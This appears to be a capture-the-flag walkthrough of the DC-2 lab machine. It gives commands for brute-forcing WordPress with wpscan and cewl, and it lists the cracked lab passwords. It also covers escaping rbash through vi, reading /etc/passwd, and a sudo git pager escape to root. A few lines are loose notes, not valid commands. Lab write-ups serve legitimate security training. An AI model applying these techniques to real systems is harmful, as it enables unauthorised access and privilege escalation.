# DC 2 Walkthrough

### Editing Hosts File

```sh
gedit /etc/hosts
ip    dc-2
>>webbrowser >> http://dc-2
```

### Flag 1

> Your usual wordlists probably wonʼt work, so instead, maybe you just need to be cewl.
> More passwords is always better, but sometimes you just canʼt win them all.
> Log in as one to see the next flag.
> If you canʼt find it, log in as another.

```sh
wpscan --url http://dc-2
### Enumerating Users and Passwords
cewl http://dc-2 > /home/pinisher/Testing/Dc-2/passwords.txt
wpscan --url http://dc-2 -U 'location/users.txt' -P 'location/passwords.txt'
```

**Valid Combinations Found:**

- Username: jerry, Password: adipiscing
- Username: tom, Password: parturient

```sh
nikto http://dc-2 >> wp-login.php
simple login to tom
```

### Flag 2

> If you can't exploit WordPress and take a shortcut, there is another way.
> Hope you found another entry point.

### Scanning for Open Ports

```sh
nmap -p- -sV <target-ip>
### Accessing SSH
ssh tom@<target-ip> -p 7744
ls /usr/bin
### Privilege Escalation
vi
:set shell=/bin/bash
:shell
echo $PATH
export PATH=$PATH:/home/tom/usr/bin:/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin
cd /usr/local
ls
```

### Flag 3
> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```sh
tom@DC-2:$ echo $(<flag3.txt)
### Checking /etc/passwd
cat /etc/passwd
```

```
tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash
jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash
```



```sh
### Switching to Jerry
su jerry
# Enter password
```

### Flag 4

> Good to see that you've made it this far - but you're not home yet.
> You still need to get the final flag (the only flag that really counts!!!).
> No hints here - you're on your own now.
> Go on - git outta here!!!!

### Exploiting Git for Privilege Escalation

```sh
sudo git branch --help config
!/bin/sh
cd root
```

### Final Flag

**Congratulations!!!**

> A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated.

